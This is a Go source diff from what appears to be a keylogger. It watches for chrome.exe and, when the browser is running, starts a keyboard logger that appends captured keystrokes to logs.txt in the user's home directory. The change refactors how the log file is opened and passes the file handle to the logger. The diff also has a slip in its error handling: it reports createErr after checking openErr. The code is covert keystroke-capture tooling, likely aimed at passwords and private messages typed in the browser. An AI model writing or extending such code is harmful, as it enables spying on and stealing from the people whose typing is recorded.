@@ -21,13 +21,18 @@ func main() {
 		}
 		logsDirectory = fmt.Sprintf("%s/logs.txt", home)
 	}
-	_, err := os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
+	var file *os.File
+	var err error
+	file, err = os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
 	if err != nil {
+		var openErr error
 		_, createErr := os.Create(logsDirectory)
-		if createErr != nil {
+		file, openErr = os.OpenFile(logsDirectory, os.O_APPEND|os.O_WRONLY, 0644)
+		if openErr != nil {
 			log.Fatal(createErr)
 		}
 	}
+	defer file.Close()
 
 	fmt.Println(logsDirectory)
 
@@ -39,7 +44,7 @@ func main() {
 		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
 		if chrome != nil {
 			if !loggerRunning {
-				go keyboardlogger.StartKeyboardLogger(logsDirectory)
+				go keyboardlogger.StartKeyboardLogger(logsDirectory, file)
 				loggerRunning = true
 			}
 		} else {
